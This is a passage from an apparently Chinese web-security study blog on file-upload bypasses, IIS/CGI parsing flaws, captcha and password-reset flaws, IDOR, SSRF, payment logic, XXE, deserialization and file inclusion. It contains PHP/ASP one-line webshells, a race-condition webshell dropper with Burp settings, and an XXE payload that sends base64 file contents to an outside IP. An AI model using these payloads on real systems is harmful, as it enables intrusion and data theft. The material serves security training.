title="7、文件后缀（点）绕过"></a>7、文件后缀（点）绕过</h4><p>windows有一个特性，会自动去掉后缀名最后的.</p><h4 id="8、-DATA（Windows文件流绕过）"><a href="#8、-DATA（Windows文件流绕过）" class="headerlink" title="8、::$DATA（Windows文件流绕过）"></a>8、::$DATA（Windows文件流绕过）</h4><p>这里利用了NTFS交换数据流（ADS），ADS是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流。通俗的理解，就是其他文件可以“寄宿”在某个文件身上，而在资源管理器中却只能看到宿主文件，找不到寄宿文件。</p><p>我们肯定不太懂这什么意思，我们现在cmd运行一个</p><pre><code>echo abcd&gt;&gt;a.txt:b.txt</code></pre><p>​    将abcd写入到a.txt:b.txt中，很明显会生成一个a.txt，但是我们打开a.txt却什么都没发现，我们要编辑就要</p><pre><code>notepad a.txt:b.txt</code></pre><p>我们用dir  /R 就可以看到a.txt:b.txt</p><p>我们饶过，就在burp中将文件名改为1.php::$DATA即可</p><h4 id="9、用php-空-绕过"><a href="#9、用php-空-绕过" class="headerlink" title="9、用php.空.绕过"></a>9、用php.空.绕过</h4><p>因为判断代码可能只去掉结尾的点</p><h4 id="10、pphphp绕过"><a href="#10、pphphp绕过" class="headerlink" title="10、pphphp绕过"></a>10、pphphp绕过</h4><p>若遇到黑名单中出现的字符串都会被变成空值，那么就用pphphp绕过，其原理就是缺乏二次校验</p><h2 id="文件上传漏洞——解析、验证、伪造（二）（白名单）"><a href="#文件上传漏洞——解析、验证、伪造（二）（白名单）" class="headerlink" title="文件上传漏洞——解析、验证、伪造（二）（白名单）"></a>文件上传漏洞——解析、验证、伪造（二）（白名单）</h2><h3 id="00截断和00截断"><a href="#00截断和00截断" class="headerlink" title="%00截断和00截断"></a>%00截断和00截断</h3><p>了解%00实际上我们要先了解0x00，0x00实际上是一个十六进制表示方法，实际上就是表示ascii码值为0，有些函数在处理这些字符的时候会把这个字符当做结束符，他们就读取到这里认为这一段结束了</p><p>这有什么用呢？</p><p>在文件上传时，如果遇到了白名单机制只允许上传jpg后缀的，在没有解析漏洞的情况下我们该怎么办？</p><p>jpg格式并不会被解析，那么我们需要绕过上传过滤。</p><p>假如我们写了1.php%00.jpg传参之后，这些过滤都是直接匹配字符串，他强行匹配到了结尾是.jpg，然后允许上传，但是php的函数去执行的时候他读取到0x00认为结束了，那么这个文件就变成了1.php</p><p>%00实际上和00截断是一模一样的原理，只不过%00是经过URL编码的，%00编码后就是0x00阶段的那个字符</p><h3 id="上传绕过方法：-1"><a href="#上传绕过方法：-1" class="headerlink" title="上传绕过方法："></a>上传绕过方法：</h3><h4 id="1、-00截断绕过"><a href="#1、-00截断绕过" class="headerlink" title="1、%00截断绕过"></a>1、%00截断绕过</h4><p>上传图片马123.jpg，burp抓包，在第一行有save_path=../upload</p><p>在他后面加上/1.php%00，查看我们上传的图片的时候把url栏中的1.php后面的删掉就可以传参或者连菜刀了</p><h4 id="2、00截断绕过"><a href="#2、00截断绕过" class="headerlink" title="2、00截断绕过"></a>2、00截断绕过</h4><p>%00是一个url编码后的结果，其实url编码就是显示16进制，0x代表16进制，%也代表16进制</p><p>burp抓包发现中的../upload，那么在后面加上/1.phpa，然后在hex模式下找到这个a，a的ascii码为61，把他的hex改为00即可</p><h4 id="3、二次渲染绕过"><a href="#3、二次渲染绕过" class="headerlink" title="3、二次渲染绕过"></a>3、二次渲染绕过</h4><p>二次渲染会让你的图片马内的一句话木马变成其他的东西，然后图片马就失效了</p><p>这里通过gif图片绕过，因为二次渲染后的gif图片，文件内容有一部分是不会被改动的</p><p>那么我们就可以在gif图片不变的这部分中写上一句话木马&lt;?php eval($_REQUEST[‘a’])?&gt;</p><p>若木马正常，但还是用不了这个木马，那就要配合其它漏洞，如文件包含解析漏洞</p><h4 id="4、条件竞争"><a href="#4、条件竞争" class="headerlink" title="4、条件竞争"></a>4、条件竞争</h4><p>核心：</p><p>先检测还是先上传 ；</p><p>先上传，再检测，删除；</p><br><p>无论是什么电脑服务器，运算肯定要时间，若我们足够快的话，能不能做到，当文件上传还在检测的时候，就访问到木马</p><p>php有函数能写文件，当访问到的时候写文件函数运行了，及时我们上传的图片马被删除了，喜闻见函数也已经写入了一个文件，就可以用这个新的木马文件</p><p>file_put_contents()：把一个字符串写入文件中</p><p>我们可以构造这样一条语句</p><pre><code>&lt;?php file_put_contents('1.php','&lt;?php eval($_REQUEST[1])?&gt;'); ?&gt;</code></pre><p>上传一个图片马，然后打开查看图片的页面，改url栏为</p><pre><code>/upload/1.php?a=&lt;?php file_put_contents('1.php','&lt;?php eval($_REQUEST[1])?&gt;'); ?&gt;</code></pre><p>这个是访问包，同时我们再次上传一个图片马，再上传过程中抓取上传包</p><p>在上传包中，将1.jpg改为1.php，然后随便选一个要跑的地方，payload type改为NUll Payloads，次数为10000次，Options中Number of Threads为15就可以了</p><p>访问包跟上面一样，访问的options为30比较好，访问的比上传快一些，比较容易成功</p><p>然后两遍同时开始跑包，当生成新木马之后就可以访问连接了</p><h2 id="文件上传解析漏洞（三）"><a href="#文件上传解析漏洞（三）" class="headerlink" title="文件上传解析漏洞（三）"></a>文件上传解析漏洞（三）</h2><p>如果某站点，你上传了PHP没有用或者无法上传的时候，是不是可以尝试下其他的脚本语言；</p><p>IIS一般来说是默认都支持ASP的；</p><p>对于网站来说，文件是怎么处理的是由后缀决定的；</p><h3 id="IIS6-0畸形解析漏洞一"><a href="#IIS6-0畸形解析漏洞一" class="headerlink" title="IIS6.0畸形解析漏洞一"></a>IIS6.0畸形解析漏洞一</h3><p>asa、cer、cdx都会被当做asp解析【这个是一个默认的设置】</p><p>我们上传asp图片马</p><pre><code>&lt;%eval request("a")%&gt;</code></pre><p>用burp将后缀改为asa，将文件存储地址复制下来然后去访问，可以用?a=a()，看是否报错来判断木马是否有效，当然用菜刀连更直接</p><h3 id="IIS6-0解析漏洞二"><a href="#IIS6-0解析漏洞二" class="headerlink" title="IIS6.0解析漏洞二"></a>IIS6.0解析漏洞二</h3><p>x.asp;.jpg</p><p>IIS会认为这是一个asp文件来解析，分号相当于结束</p><p>IIS5.1和7.5均无此漏洞</p><h3 id="IIS6-0解析漏洞三"><a href="#IIS6-0解析漏洞三" class="headerlink" title="IIS6.0解析漏洞三"></a>IIS6.0解析漏洞三</h3><p>在IIS6.0中，文件夹名若是x.asp，那么这个文件夹下任意文件都会被当做asp来执行</p><p>FCK编辑器或者是后台，有很多功能-&gt;可移动文件，可创建目录</p><p>IIS7.5及以上的，若没有关闭报错的话，会爆出他的绝对路径</p><h3 id="CGI解析漏洞"><a href="#CGI解析漏洞" class="headerlink" title="CGI解析漏洞"></a>CGI解析漏洞</h3><p>上传php图片马之后，查看图片，url后加上/.php图片就会被解析进而可以传参</p><p>这就是CGI解析漏洞</p><p>适用范围：PHP（只有PHP能用）</p><p>中间件任意：IIS7.5  Nginx这些</p><h4 id="如何判断此漏洞是否存在？"><a href="#如何判断此漏洞是否存在？" class="headerlink" title="如何判断此漏洞是否存在？"></a>如何判断此漏洞是否存在？</h4><p>打开这个网站中的某张图片，然后/.php，如果乱码了，则存在CGI解析漏洞，找到上传点就可以撸掉</p><h3 id="文件上传的目的是为了什么？"><a href="#文件上传的目的是为了什么？" class="headerlink" title="文件上传的目的是为了什么？"></a>文件上传的目的是为了什么？</h3><p>就是为了上传的文件可以任意代码执行，达到对目标的控制，也就是getshell</p><p>getshell的方法有很多，不止有上传文件</p><p>例：</p><p>1、备份数据库，修改数据库名，在老CMS里，备份文件的名字可以自定义，数据库里写一个小马的数据，然后备份文件名改为xxx.asp就可以解析</p><p>2、后台功能强大，可以新建文件；</p><p>有些编辑器，他们可以改变上传文件类型的配置，若拥有执行SQL语句的能力，可以用</p><pre><code>select 1 into dump file 'C:/1.txt'</code></pre><h2 id="验证码绕过、密码找回漏洞"><a href="#验证码绕过、密码找回漏洞" class="headerlink" title="验证码绕过、密码找回漏洞"></a>验证码绕过、密码找回漏洞</h2><p>逻辑漏洞：它的问题不存在于代码，而是开发者逻辑的问题</p><p>第一种验证码，是一种区分用户是计算机 还是认得公共全自动程序；</p><p>可以防止：恶意破解密码、刷票、论坛灌水、有效防止某个黑客对某一个特定注册用户用特定程序暴力破解方式进行不断地登录尝试，实际上用验证码是现在很多网站通行的方法，我们利用比较简易的方法实现了这个功能；</p><p>这个问题可以由计算机生成评判，但是必须只有人类才能解答。由于计算机无法解答CAPTCHA的问题，所以回答出问题的用户就可以被认为是人类。</p><p>第二种验证码就是证明你身份的验证码，如：邮箱验证码、短信验证码</p><h3 id="验证码绕过的常见姿势"><a href="#验证码绕过的常见姿势" class="headerlink" title="验证码绕过的常见姿势"></a>验证码绕过的常见姿势</h3><p>一、前端验证验证码，并没有后端验证。直接抓包然后进行跑数据，反正也没有验证码的阻碍；</p><p>二、验证码设置了但是没有效验，乱输验证码也能够成功的登录（估计是老板没给开发工资吧）；</p><p>三、验证码可以重复使用，比如现在的验证码是1111，然后虽然你登录失败后验证吗会变，但是你输入1111他却判定你验证码正确（常见）<a href="https://www.uedbox.com/post/14207/" target="_blank" rel="noopener">https://www.uedbox.com/post/14207/</a></p><p>四、验证码空值绕过，比如，我们现在抓一个包，发现登录参数是user=admin&amp;password=admin&amp;yzm=4123。</p><p>yzm验证码参数，但是我们如果去掉yzm的传参我们就可以让过验证码机制，直接传参user=admin&amp;password=admin，验证码就失效了 <a href="https://www.uedbox.com/post/22266/" target="_blank" rel="noopener">https://www.uedbox.com/post/22266/</a></p><p>五、验证码干扰过低，轻松使用脚本识别<a href="https://www.uedbox.com/post/10085/" target="_blank" rel="noopener">https://www.uedbox.com/post/10085/</a></p><p>六、验证码会在HTML页面输出。<a href="https://www.uedbox.com/post/16869" target="_blank" rel="noopener">https://www.uedbox.com/post/16869</a></p><p>七、验证码可控制，比如他的验证码包含在URL里面，是一个URL传参，我们可以把URL设置定下来，那么验证码可控制<a href="https://www.uedbox.com/post/29913" target="_blank" rel="noopener">https://www.uedbox.com/post/29913</a></p><p>八、验证码有规则，比如是时间戳的后6位（rand函数进行随机数）</p><p>九、有万能验证码，验证码无论是是什么，只要输入万能验证码就可以直接绕过</p><p>十、验证码有的时候会藏在cookie里面，分析一下是不是存在验证码的参数</p><p>十一、图片验证码，类型太少，容易识别<a href="https://www.uedbox.com/post/24112" target="_blank" rel="noopener">https://www.uedbox.com/post/24112</a></p><p>多次登录之后才出现验证码绕过：</p><p>基于session：<a href="https://www.uedbox.com/post/22043" target="_blank" rel="noopener">https://www.uedbox.com/post/22043</a></p><p>基于ip：<a href="https://www.uedbox.com/post/28442" target="_blank" rel="noopener">https://www.uedbox.com/post/28442</a></p><p>基于用户：爆破用户名，而非爆破密码</p><p><strong>验证码绕过只有登录成功它才是一个漏洞</strong></p><br><h3 id="密码找回漏洞"><a href="#密码找回漏洞" class="headerlink" title="密码找回漏洞"></a>密码找回漏洞</h3><p>第一种就是找回密码，往邮箱发送明文或密文的面膜或者验证码（手机短信验证就是往你手机号码发送验证码）通过这样的方法来判断是否是本人</p><p>第二种发送一个重置密码的链接到邮箱</p><p>上述的面膜找回方法会有什么样的漏洞呢？</p><p>1、验证码发送后前端返回<a href="https://www.uedbox.com/post/13890" target="_blank" rel="noopener">https://www.uedbox.com/post/13890</a></p><p>2、验证码无数次限制可爆破<a href="https://www.uedbox.com/post/15675" target="_blank" rel="noopener">https://www.uedbox.com/post/15675</a></p><p>3、验证码可控<a href="https://www.uedbox.com/post/26992" target="_blank" rel="noopener">https://www.uedbox.com/post/26992</a></p><p>4、直接修改密码页面<a href="https://www.uedbox.com/post/35739" target="_blank" rel="noopener">https://www.uedbox.com/post/35739</a></p><p>5、越权漏洞–&gt;自己验证码通过改包然后修改他们密码</p><p><a href="https://www.uedbox.com/post/24098/" target="_blank" rel="noopener">https://www.uedbox.com/post/24098/</a></p><p><a href="https://www.uedbox.com/post/42136" target="_blank" rel="noopener">https://www.uedbox.com/post/42136</a></p><br><p>在注册之前，通过预先设定一个密保问题，忘记密码时，通过此密保进行认证，认证成功进入密码修改页面。</p><p>密保问题可能容易直接被猜解（比如很多学校的知道学号和身份证号码就可以重置校园通的密码）</p><p>密保问题答案页面中显示（数据包里面可能自带了密保答案，可能在JS里面</p><h2 id="越权——通过修改参数获取管理员权限"><a href="#越权——通过修改参数获取管理员权限" class="headerlink" title="越权——通过修改参数获取管理员权限"></a>越权——通过修改参数获取管理员权限</h2><p>越权访问：这类漏洞是指应用在检查授权时存在纰漏，使得攻击者在获得低权限用户账号后，可以利用一些方法绕故宫权限检测，访问或者操作原本无权访问的高权限功能。在实际的代码安全审查中，这类漏洞往往很难通过工具进行自动化检测，因此在实际应用中危害很大。其与未授权访问有一定差别。目前存在这两种操作类型：水平越权和垂直越权操作。</p><p>水平越权：是指相同权限下不同的用户可以互相访问；</p><p>垂直越权：是指使用权限低的用户可以访问到权限较高的用户水平越权测试方法主要就是看看能够通过A用户操作影响到B用户；</p><p>垂直越权的测试四楼就是低权限用户使用高权限用户的功能，比如普通用户可使用管理员功能。</p><p>还有一种交叉越权：A用户既能修改掉B用户的密码，也能修改掉管理员的密码</p><h3 id="越权测试过程"><a href="#越权测试过程" class="headerlink" title="越权测试过程"></a>越权测试过程</h3><p>越权测试</p><p>登录A用户时，正常更改或者是查看A用户信息，然后抓取数据包，将传参ID修改为其他用户，如果成功查看或者修改了同权限其他用户的信息就属于水平越权测试。（如果可以影响到高权限用户就是垂直越权）</p><p>传参ID参数需要自己检测（常见：uid= id= user=等）通常使用burp进行爆破传参（传承可能在GET、POST、COOKIE）</p><p>常见平行越权（不需要输入原密码的修改密码，抓包该用户名或者用户id修改他人密码；修改资料的时候修改用户id；查看订单的时候，遍历订单id等）</p><br><p>还有一种叫做未授权访问，严格意义上而言这个不属于越权漏洞，但是在日常测试中常常会遇到（只要输入正确的网址就可以直接访问，例如：/admin默认是登录，登录后跳转到了user.php，然后你直接访问user.php，发现你直接有后台权限）</p><p>可以通过目录爆破来得到页面地址</p><h2 id="SSRF——服务器端请求伪造"><a href="#SSRF——服务器端请求伪造" class="headerlink" title="SSRF——服务器端请求伪造"></a>SSRF——服务器端请求伪造</h2><p>SSRF就是你可以控制目标站点去访问其他网站</p><p>有一种经典的环境就是在线翻译，那么翻译是怎么翻译的呢？</p><p>①、获取你访问的页面，然后翻译；</p><p>②、翻译网站的服务器去访问页面，然后翻译给你。</p><p>访问ip.cn查看自己的公网IP，对照翻译网站访问的ip.cn查看的ip，如果不一样则为②，但是这样的网站不一定存在SSRF</p><h3 id="SSRF划分界限："><a href="#SSRF划分界限：" class="headerlink" title="SSRF划分界限："></a>SSRF划分界限：</h3><p>第一种说法：</p><p>​    只要能发起网络请求就是存在漏洞，因为有风险。例：假如我们找有道翻译，然后攻击政府网站，那有道就成了我们的跳板；</p><p>第二种说法：</p><p>​    只有访问到内网和本机才算存在SSRF，因为第一种说法是不可避免的</p><p>为什么访问到本机和内网才有严重危害呢？正是因为外紧内松的原因；</p><p>本机比内网更加脆弱，本机就是自己的电脑，自己访问自救属于很正常的操作</p><h3 id="SSRF能做什么？"><a href="#SSRF能做什么？" class="headerlink" title="SSRF能做什么？"></a>SSRF能做什么？</h3><p>扫描内部网络；</p><p>向内部任意主机的任意端口发送精心构造的包；</p><p>DOS（请求大文件，始终保持连接keep-Aline Always）；</p><p>暴力穷举（users/dirs/Files）。</p><p>很多站点和防护软件，对127.0.0.1的本地访问并不会拦截，当你有网站管理员权限的时候，某些站点的自带防护也不会拦截</p><p><strong>信息安全的本质——信任问题</strong></p><p>第一种危害：我们可以通过过http访问到一些未开发完的网站</p><p>第二种危害：SSRF不只有支持HTTP协议，通过file协议可以获取到php的源码，能够读取是很有用的，去读一些配置文件很有可能得到数据库的账号密码，不只有file协议，还有很多其他的协议也支持；dict协议（字典协议）：查询开放的端口</p><h3 id="怎么寻找SSRF"><a href="#怎么寻找SSRF" class="headerlink" title="怎么寻找SSRF"></a>怎么寻找SSRF</h3><p>1、看功能（出现外部访问，如：翻译）</p><p>2、看传参，如果该说传参中存在有后缀的东西，例：?url=<a href="http://127.0.0.1/1.php?urs=2.php" target="_blank" rel="noopener">http://127.0.0.1/1.php?urs=2.php</a></p><p>有传参可能有：</p><p>①、读取文件显示给你；</p><p>②、包含文件（文件包含）；</p><p>③、下载文件</p><p>或者传参中有协议名，如：http://</p><h3 id="防护SSRF"><a href="#防护SSRF" class="headerlink" title="防护SSRF"></a>防护SSRF</h3><p>例：通过正则匹配，不允许你穿内网地址；127.0.0.1=&gt;拦截访问</p><p>怎么绕过正则？</p><p>1、域名肯定是要解析成IP，我们自己申请一个域名，把地址指向127.0.0.1，dnslog.cn这个平台的域名可以解决这个问题，它上面的域名都是访问到本机的</p><p>子域名有一种情况叫做泛解析：当这个域名没有特殊规定的时候，自动解析到某个ip</p><p>2、通过@</p><p>例：?url=<a href="http://http://baidu.com@127.0.0.1/1.php，当被检测不能用http://127.0.0.1时就用@，baidu.com" target="_blank" rel="noopener">http://http://baidu.com@127.0.0.1/1.php，当被检测不能用http://127.0.0.1时就用@，baidu.com</a> 相当于一个名字</p><h2 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h2><h3 id="1、快捷支付原理"><a href="#1、快捷支付原理" class="headerlink" title="1、快捷支付原理"></a>1、快捷支付原理</h3><p>我们在网购平台买东西，花了钱，平台肯定要知道你付了钱，双湖网站接入支付结果有两种方法</p><p>​    ①、浏览器跳转（基本遇不到）</p><p>​                基于用户访问的浏览器，如果用户在银行页面支付成功后，直接关闭了页面，并未等待银行跳转到支付结果页面，那么商户网站就收不到支付结果的通知，导致支付结果难以处理。而且浏览器端数据很容易被篡改而降低安全度。</p><p>​    ②、服务器端异步通知</p><p>​                该方式是支付公司服务器后台直接向用户指定的异步通知URL发送参数，采用POST或GET的方式。商户网站接受异步参数的URL对应的程序中，要对支付公司返回的支付结果进行签名验证，成功后进行支付逻辑处理，如验证金额、订单信息是否与发起支付时一致，验证正常则对订单进行状态处理或者为用户进行网站内入账等。</p><p>支付漏洞属于逻辑漏洞，不需要代码审计</p><h3 id="常见支付漏洞"><a href="#常见支付漏洞" class="headerlink" title="常见支付漏洞"></a>常见支付漏洞</h3><ul><li>修改支付的价格；</li><li>修改支付的状态；</li><li>修改订单数量；</li><li>修改附加值；</li><li>越权支付；</li><li>无限制试用。</li></ul><h3 id="2、如何挖掘支付漏洞"><a href="#2、如何挖掘支付漏洞" class="headerlink" title="2、如何挖掘支付漏洞"></a>2、如何挖掘支付漏洞</h3><ul><li><p>找到关键的数据包</p><p>可能一个支付操作有三四个数据包，我们要对数据包进行挑选。</p></li><li><p>分析数据包</p><p>支付数据包中会包含很多的敏感信息（账号，金额，余额，优惠），要尝试对数据包中的各个参数进行分析。</p></li><li><p>不按套路出牌<br>多去想想开发者没有想到的地方</p></li><li><p>pc端尝试过，wap端也看看，app也试试</p></li></ul><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul><li>后端检测每一项值，包括支付状态；</li><li>效验价格、数量参数，比如产品数量只能为正整数，并限制购买数量；</li><li>与第三方支付平台检查，实际支付的金额是否与订单金额一致；</li><li>支付参数进行MD5加密、解密、数字签名及验证，这个可以有效的避免数据修改，重放攻击中的各种问题；</li><li>金额查过阈值，进行人工审核。</li></ul><h2 id="XXE——实体注入"><a href="#XXE——实体注入" class="headerlink" title="XXE——实体注入"></a>XXE——实体注入</h2><p>XML外部实体注入</p><p>XXE：用户输入的数据被当做XML代码执行</p><h3 id="什么是-XML？"><a href="#什么是-XML？" class="headerlink" title="什么是 XML？"></a>什么是 XML？</h3><p>XML指扩扩展标记语言（EXtensible Markup Language）；</p><p>XML是一种标记语言，很类似HTML；</p><p>XML的设计宗旨是传输数据，而非显示数据；</p><p>XML标签没有被预定义，您需要自行定义标签；</p><p>XML被设计为具有自我描述性；</p><p>XML是W3C的推荐标准。</p><br><p>特点：</p><p>XML:仅仅是纯文本，他不会做任何事情；</p><p>XML可以自己发明标签（允许定义自己的标签和文档结构）</p><br><p>XML无所不在。XML是各种应用程序之间进行数据传输的最常用的工具，并且在信息存储和描述领域变得越来越流行。</p><br><p>总的来说，这玩意儿就是个存储数据的。</p><p>他是怎么存储数据的呢？</p><p>存一份模板，再存一堆东西，模板怎么来</p><p>就是去要去家在某个文件，这个部分就是DTD</p><p>这里可以获取访问加载xxxx，那么是不是可以获取本机文件呢！？</p><h3 id="XXE是什么？"><a href="#XXE是什么？" class="headerlink" title="XXE是什么？"></a>XXE是什么？</h3><p>XXE=XML External Entity即外部实体，从安全角度理解成XML External Entity attack XML外部实体注入攻击。</p><p>典型的攻击如下：</p><pre><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE foo[    &lt;!ELEMENT foo ANY&gt;    &lt;!ENTITY xxe SYSTEM "file://etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre><p>第行是XML声明；</p><p>第2,3,4行是DTD部分；</p><p>最后一行是XML部分</p><p>定义实体必须写在DTD部分</p><h3 id="XXE原理"><a href="#XXE原理" class="headerlink" title="XXE原理"></a>XXE原理</h3><p>php中存在一个叫做simple_load_string的函数</p><p>这个函数是将XML转化为对象</p><p>实例：</p><pre><code>&lt;?php$test='&lt;!DOCTYPE scan [&lt;!ENTITY test SYSTEM "file:///c:/1.txt"&gt;]&gt;&lt;scan&gt;&amp;test;&lt;/scan&gt;';$obj=simplexml_load_string($test,'SimpleXMLElement',LIBXML_NOENT);print_r($obj);?&gt;</code></pre><p>变量test来面是XML</p><p>然后使用simplexm;_load_string将其转化为对象，第一个参数是XML语句，simpleXMlElement是滴啊用了SimpleXMLElement这个类，然后LIBXML_NOENT是替代实体，然后他去执行了file协议去读取我的文件</p><p>有了XML实体，关键字‘SYSTEM’会令XMl解析器从URL中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容（可能是系统上本地文件亦或是亚UN成系统上的文件）</p><h3 id="XXE——扩展"><a href="#XXE——扩展" class="headerlink" title="XXE——扩展"></a>XXE——扩展</h3><pre><code>&lt;!ENTITY 实体名称 SYSTEM “URI/URL"&gt;</code></pre><p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下：</p><table><thead><tr><th>libxml2</th><th>PHP</th><th>Java</th><th>.NET</th></tr></thead><tbody><tr><td>file</td><td>file</td><td>http</td><td>file</td></tr><tr><td>http</td><td>http</td><td>https</td><td>http</td></tr><tr><td>ftp</td><td>ftp</td><td>ftp</td><td>https</td></tr><tr><td></td><td>php</td><td>file</td><td>ftp</td></tr><tr><td></td><td>compress.zlib</td><td>jar</td><td></td></tr><tr><td></td><td>compress.bzip2</td><td>netdoc</td><td></td></tr><tr><td></td><td>data</td><td>mailto</td><td></td></tr><tr><td></td><td>glob</td><td>gopher *</td><td></td></tr><tr><td></td><td>phar</td><td></td><td></td></tr></tbody></table><p>XXE中也存在不给你显示的情况（类似于盲注）</p><p>1、利用其他东西证明其存在</p><p>2、将想要的数据外带出来</p><p>如：DNS注入、反弹注入</p><p>我们先读取我们想要的文件，然后为了传输方便，我们先来个base64编码，我们可以使用php伪协议读取文件（仅PHP支持）</p><pre><code>php://filter/read=convert.base64-encode/resource=c:/1.txt</code></pre><p>然后我们再去调用一个外部xml，比如1.xml</p><pre><code>&lt;!ENTITY % remote SYSTEM "http://192.168.192.131/1.xml"&gt;</code></pre><pre><code>&lt;!ENTITY % all"&lt;!ENTITY &amp;#25;send SYSTEM 'http://120.203.13.75:8123/xxe/2.php?id=%file;'&gt;"&gt;%all;</code></pre><p>这个1.xml会被加载到原本的Xml，然后我们最后来调用，然后你读取出来的文件会用get传承那的方式传参给2.php然后2.php记录下来存储到3.txt中</p><pre><code>&lt;?php fiel_put_contents("3.txt",$_GET["id"],FILE_APPEND;?&gt;</code></pre><p>我们可以通过获取别人访问我这个文件传的参数，然后将这个参数存储下来，来做到获取别人数据的方法，</p><p>所以我们需要一个炮台（公网ip）</p><h2 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h2><p>$a=1;$a=2;</p><p>echo $a;=&gt;2</p><p>引发变量覆盖漏洞的函数有：</p><p><strong>extract()：将数组中将变量导入到当前的符号表；</strong></p><p><strong>parse_str()：将查询字符串解析到变量中；</strong></p><p>import_request_variables()</p><p>PHP中一个等号是赋值；两个等号是比较（值）；三个等号是即比较值又比较类型</p><p><strong>trim()：去掉变量头部和尾部的空格；</strong></p><p><strong>isset()：检查变量是否存在。</strong></p><p>变量覆盖漏洞是特属于白盒代码审计的。</p><h3 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h3><p>不仅仅是函数会导致变量覆盖，有些特殊符号的特殊搭配也会引起变量覆盖漏洞，比如$$</p><p>$$导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现，如以下的示例代码，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的值作为变量的值。因此就产生了变量覆盖漏洞。请求?name=test会将$name的值覆盖，变为test</p><p>例题：</p><pre><code>&lt;?php$a=1;foreach(array('_COOKIE','_POST','_GET')as $_request){foreach($$_request as $_key=&gt;$_value){$$_key=addslashes($_value);}}echo $a;?&gt;</code></pre><p>这个代码会接受我们的GET提交、POST提交、COOKIE参数，将这个接受来的参数依次放入$_request</p><p>$_key=&gt;$_value是固定搭配，键值分离；$_key为数组里的键；$_value为数组里的值</p><p>正常而言$a=1是一个定值，但是因为$$_key的缘故，当我传参a=2；那么$$_key=addslashes($_value);就变为了$a=2.</p><p><strong>addslashes()：在每个引号前加一个反斜杠0</strong></p><h2 id="unserialize反序列化漏洞"><a href="#unserialize反序列化漏洞" class="headerlink" title="unserialize反序列化漏洞"></a>unserialize反序列化漏洞</h2><p>序列化=&gt;存档[保存当前的状态]    serialize()</p><p>反序列化=&gt;读档[还原序列化时的状态]    unserialize()</p><p>类：一种模板</p><p>对象：对象就是看得见的物体我们进行操作、过程</p><p>class就是类（标识）</p><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>当在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。</p><p>再类里面方法就是函数</p><p>在类中有一些特殊的方法[函数]</p><p>可以做到自动触发</p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>是一种自动触发的函数，满足条件就触发</p><ul><li>__construct：对象创建的时候会自动调用 </li><li>__destruct：对象销毁的时候会自动调用</li><li>__wakeup：在使用unserialize函数的时候会被调用</li></ul><p><strong>对象被调用后就会销毁</strong></p><p>当对象要是用一个方法的时候要用“-&gt;”</p><p>例：</p><pre><code>$un = unserialize($class2);$un -&gt; ();</code></pre><p><strong>反序列化一定要白盒代码审计的</strong></p><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>本质上serialize()和unserialize()在PHP内部实现上是没有漏洞的，漏洞的主要产生是由于应用程序在处理对象、魔术函数以及序列化相关问题的时候导致的。</p><p>当传给unserialize()的参数可控时，那么用户就可以注入精心构造的payload。当进行反序列化的时候就可能会触发对象中的一些魔术方法，造成意想不到的危害。</p><h2 id="本地包含与远程包含"><a href="#本地包含与远程包含" class="headerlink" title="本地包含与远程包含"></a>本地包含与远程包含</h2><h3 id="什么是文件包含漏洞"><a href="#什么是文件包含漏洞" class="headerlink" title="什么是文件包含漏洞"></a>什么是文件包含漏洞</h3><p>攻击者利用包含的特性，加上应用本身对文件(包含)控制不严格，最终造成攻击者进行任意文件包含。(注：包含的文件会被当做脚本文件来解析)</p><p>一句话来说既是：文件包含并不属于漏洞，但是，由于对包含进来的文件不可控，导致了文件包含漏洞的产生。</p><p>注：包含文件很有用，可以简化代码</p><p>文件包含分为本地和远程文件包含（需要allow_url_include = On）</p><p>本地文件包含：LFI</p><p>远程文件包含：RFI</p><br><p>假如你进入了后台，那么后台中的每一个页面应该都会验证你的权限，但是每个PHP文件中都写上验证的那段代码就会佷冗余，于是开发定义了一个文件包含函数，可以引用那个用于验证的代码写的文件。</p><p><strong>那么这个文件里面的内容一定会被当作PHP执行，不管任何后缀</strong></p><p>file_put_contents()：创建文件</p><p>例：</p><pre><code>&lt;?php file_put_contents('1.php','&lt;?php eval($_REQUEST[a])?&gt;');?&gt;</code></pre><p>当你能够任意控制包含的文件的时候，文件包含就有漏洞了</p><p>本地文件包含：包含服务器上的资源，比如你上传的马</p><p>远程文件包含：通过http协议包含其他地方的资源</p><h3 id="函数解析-1"><a href="#函数解析-1" class="headerlink" title="函数解析"></a>函数解析</h3><p>include：使用include一你用外部文件时，只有代码执行到include代码段时，调用的外部文件才会被引用并读取，当引用的文件发生错误时，系统只会给出个警告错误，而整个php文件会继续执行。</p><p>require：在 